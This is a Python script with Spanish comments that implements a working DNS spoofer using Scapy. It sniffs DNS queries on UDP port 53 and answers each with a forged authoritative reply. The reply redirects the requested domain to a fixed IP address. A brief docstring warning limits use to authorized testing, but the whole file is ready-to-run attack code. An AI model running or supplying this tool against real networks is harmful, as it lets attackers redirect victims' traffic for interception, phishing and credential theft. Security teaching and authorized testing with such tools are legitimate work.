#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DNS Spoofer en Python usando Scapy
==================================

Este script intercepta solicitudes DNS y responde con direcciones IP falsas.
Requiere privilegios de root para funcionar correctamente.

Advertencia: Solo debe usarse en entornos de prueba o con autorización explícita.
"""

import sys
from scapy.all import *

def process_packet(packet):
    """
    Procesa cada paquete capturado para detectar solicitudes DNS.
    
    Args:
        packet: Paquete de red capturado por Scapy
    """
    # Verifica si el paquete tiene capas IP, UDP y DNS
    if packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(DNS):
        # Extrae la consulta DNS
        dns_query = packet[DNS]
        
        # Solo procesamos consultas (qr == 0 indica consulta, qr == 1 sería respuesta)
        if dns_query.qr == 0:
            # Obtiene el nombre de dominio solicitado
            domain_name = dns_query.qd.qname.decode('utf-8')
            print(f"[+] Consulta DNS interceptada: {domain_name}")
            
            # Crea una respuesta DNS falsa
            spoofed_dns_response = create_dns_response(packet, domain_name)
            
            # Envía la respuesta falsa
            send(spoofed_dns_response, verbose=0)
            print(f"[!] Respuesta falsa enviada para {domain_name}")

def create_dns_response(original_packet, domain_name):
    """
    Crea una respuesta DNS falsa para el dominio solicitado.
    
    Args:
        original_packet: El paquete DNS original
        domain_name: El nombre de dominio solicitado
        
    Returns:
        Paquete DNS de respuesta falsa
    """
    # Dirección IP falsa que queremos que el cliente reciba
    # Puedes cambiar esta IP por la que desees
    spoofed_ip = "192.168.1.100"
    
    # Construye la respuesta DNS falsa
    dns_response = IP(dst=original_packet[IP].src, src=original_packet[IP].dst) / \
                   UDP(dport=original_packet[UDP].sport, sport=53) / \
                   DNS(
                       id=original_packet[DNS].id,  # Mismo ID que la consulta
                       qr=1,  # Es una respuesta
                       aa=1,  # Autoritativo
                       qd=original_packet[DNS].qd,  # Sección de pregunta original
                       an=DNSRR(rrname=domain_name, ttl=300, rdata=spoofed_ip)  # Registro de respuesta
                   )
    
    return dns_response

def main():
    """
    Función principal del programa.
    """
    # Verifica que el script se esté ejecutando como root
    if not sys.platform.startswith('win') and os.geteuid() != 0:
        print("[!] Este script requiere privilegios de root en sistemas Unix/Linux")
        sys.exit(1)
    
    print("[*] Iniciando DNS Spoofer...")
    print("[*] Interceptando tráfico DNS. Presiona Ctrl+C para detener.")
    
    try:
        # Sniff (captura) todos los paquetes UDP en el puerto 53 (puerto DNS)
        sniff(filter="udp port 53", prn=process_packet, store=0)
    except KeyboardInterrupt:
        print("\n[.] Deteniendo DNS Spoofer...")
        sys.exit(0)

# Ejecuta la función principal si el script se ejecuta directamente
if __name__ == "__main__":
    main()